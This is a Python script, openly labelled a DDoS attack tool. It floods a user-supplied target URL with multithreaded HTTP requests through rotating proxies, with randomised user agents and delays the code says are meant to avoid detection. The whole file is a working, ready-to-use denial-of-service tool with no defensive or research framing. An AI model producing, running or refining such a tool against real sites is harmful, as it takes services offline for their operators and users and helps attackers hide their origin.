import requests
import threading
import random
import time

# Load proxy list
def load_proxies():
    with open("proxies.txt", "r") as file:
        return [proxy.strip() for proxy in file.readlines()]

# Rotating user agents for each request
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/537.36"
]

# Attack function
def attack(target_url, proxy_list, thread_count, duration):
    def send_request():
        session = requests.Session()
        headers = {
            "User-Agent": random.choice(user_agents),
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive"
        }
        end_time = time.time() + duration
        
        while time.time() < end_time:
            proxy = random.choice(proxy_list)
            proxies = {"http": proxy, "https": proxy}
            try:
                response = session.get(target_url, headers=headers, proxies=proxies, timeout=3)
                print(f"Sent request via {proxy} | Status: {response.status_code}")
            except requests.RequestException:
                print(f"Proxy {proxy} failed, rotating...")
                proxy_list.remove(proxy)  # Remove dead proxy
                if not proxy_list:
                    print("All proxies failed. Attack aborted.")
                    return
            
            time.sleep(random.uniform(0.1, 0.5))  # Random delay to prevent detection

    # Launch attack with multiple threads
    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=send_request)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

# Lobby interface
def main():
    print("=== ULTIMATE DDoS ATTACK LOBBY ===")
    target_url = input("Enter target URL: ")
    thread_count = int(input("Enter number of threads (100+ recommended): "))
    duration = int(input("Enter attack duration (seconds): "))

    proxies = load_proxies()
    if not proxies:
        print("No proxies found in proxies.txt!")
        return
    
    print(f"Unleashing enhanced attack on {target_url} with {thread_count} threads for {duration} seconds...")
    attack(target_url, proxies, thread_count, duration)

if __name__ == "__main__":
    main()
